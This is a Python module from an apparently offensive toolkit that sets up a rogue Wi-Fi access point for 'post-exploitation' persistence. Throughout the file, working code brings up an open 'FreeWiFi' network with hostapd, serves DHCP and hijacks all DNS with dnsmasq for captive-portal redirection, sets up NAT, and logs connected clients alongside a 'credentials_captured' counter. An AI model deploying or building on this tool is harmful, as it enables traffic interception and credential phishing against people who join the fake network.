"""
Rogue AP Manager
================
Automated rogue access point deployment with DHCP, DNS,
and captive portal redirection for post-exploitation.
"""

import os
import subprocess
import tempfile
import time
from typing import Optional, Dict, Any

from bhisma.core.config import BhismaConfig


class RogueAPManager:
    """Manages rogue AP persistence infrastructure."""

    def __init__(self, iface: str, config: Optional[BhismaConfig] = None):
        self.iface = iface
        self.config = config or BhismaConfig.load()
        self._hostapd_proc: Optional[subprocess.Popen] = None
        self._dnsmasq_proc: Optional[subprocess.Popen] = None
        self._running = False
        self.stats: Dict[str, Any] = {
            "clients_connected": 0,
            "requests_served": 0,
            "credentials_captured": 0,
        }
        self.client_list: Dict[str, Dict[str, Any]] = {}

    def _generate_hostapd_conf(
        self, ssid: str, channel: int = 6,
        encryption: str = "OPN", password: Optional[str] = None
    ) -> str:
        """Generate hostapd configuration file."""
        conf_path = os.path.join(tempfile.gettempdir(), "bhisma_hostapd.conf")
        with open(conf_path, "w") as f:
            f.write(f"interface={self.iface}\n")
            f.write("driver=nl80211\n")
            f.write(f"ssid={ssid}\n")
            f.write(f"channel={channel}\n")
            f.write("hw_mode=g\n")
            f.write("ieee80211n=1\n")
            f.write("wmm_enabled=1\n")

            if encryption == "WPA2" and password:
                f.write("wpa=2\n")
                f.write("wpa_key_mgmt=WPA-PSK\n")
                f.write(f"wpa_passphrase={password}\n")
                f.write("rsn_pairwise=CCMP\n")

        return conf_path

    def _generate_dnsmasq_conf(self, gateway: str = "10.0.0.1") -> str:
        """Generate dnsmasq DHCP/DNS configuration."""
        conf_path = os.path.join(tempfile.gettempdir(), "bhisma_dnsmasq.conf")
        with open(conf_path, "w") as f:
            f.write(f"interface={self.iface}\n")
            f.write(f"dhcp-range={gateway.rsplit('.', 1)[0]}.10,{gateway.rsplit('.', 1)[0]}.250,255.255.255.0,12h\n")
            f.write(f"dhcp-option=3,{gateway}\n")
            f.write(f"dhcp-option=6,{gateway}\n")
            f.write("server=8.8.8.8\n")
            f.write("log-queries\n")
            f.write("log-dhcp\n")
            # Redirect all DNS to gateway (captive portal)
            f.write(f"address=/#/{gateway}\n")
        return conf_path

    def deploy(self, ssid: str = "FreeWiFi", channel: int = 6,
               encryption: str = "OPN", password: Optional[str] = None,
               gateway: str = "10.0.0.1") -> bool:
        """
        Deploy rogue AP with DHCP and DNS redirection.

        Args:
            ssid: Rogue AP network name
            channel: WiFi channel
            encryption: 'OPN' | 'WPA2'
            password: WPA2 passphrase (required if encryption='WPA2')
            gateway: Gateway IP for DHCP pool

        Returns:
            True if deployment started successfully
        """
        try:
            # Configure interface
            subprocess.run(
                ["ip", "addr", "flush", "dev", self.iface],
                capture_output=True,
            )
            subprocess.run(
                ["ip", "addr", "add", f"{gateway}/24", "dev", self.iface],
                capture_output=True,
            )
            subprocess.run(
                ["ip", "link", "set", self.iface, "up"],
                capture_output=True,
            )

            # Enable IP forwarding
            subprocess.run(
                ["sysctl", "-w", "net.ipv4.ip_forward=1"],
                capture_output=True,
            )

            # Setup NAT if internet sharing desired
            subprocess.run(
                ["iptables", "-t", "nat", "-A", "POSTROUTING",
                 "-o", "eth0", "-j", "MASQUERADE"],
                capture_output=True,
            )

            # Start dnsmasq
            dnsmasq_conf = self._generate_dnsmasq_conf(gateway)
            self._dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", "-C", dnsmasq_conf, "-d"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            # Start hostapd
            hostapd_conf = self._generate_hostapd_conf(
                ssid, channel, encryption, password
            )
            self._hostapd_proc = subprocess.Popen(
                ["hostapd", hostapd_conf],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            self._running = True
            return True

        except FileNotFoundError as e:
            print(f"[RogueAP] Required tool not found: {e}")
            return False
        except Exception as e:
            print(f"[RogueAP] Deployment error: {e}")
            return False

    def add_client(self, mac: str, ip: str, hostname: str = "") -> None:
        """Record a client connecting to the rogue AP."""
        self.client_list[mac] = {
            "ip": ip,
            "hostname": hostname,
            "connected_at": time.time(),
        }
        self.stats["clients_connected"] = len(self.client_list)

    def get_clients(self) -> Dict[str, Dict[str, Any]]:
        """Get list of connected clients."""
        return self.client_list

    def teardown(self) -> None:
        """Shutdown rogue AP and restore network settings."""
        self._running = False
        if self._hostapd_proc:
            self._hostapd_proc.terminate()
            self._hostapd_proc.wait(timeout=3)
        if self._dnsmasq_proc:
            self._dnsmasq_proc.terminate()
            self._dnsmasq_proc.wait(timeout=3)

        # Cleanup iptables
        subprocess.run(
            ["iptables", "-t", "nat", "-F"],
            capture_output=True,
        )

        # Cleanup temp configs
        for f in ["bhisma_hostapd.conf", "bhisma_dnsmasq.conf"]:
            path = os.path.join(tempfile.gettempdir(), f)
            if os.path.exists(path):
                os.remove(path)

    def get_stats(self) -> Dict[str, Any]:
        """Return rogue AP statistics."""
        return {
            **self.stats,
            "running": self._running,
            "active_clients": len(self.client_list),
            "iface": self.iface,
        }
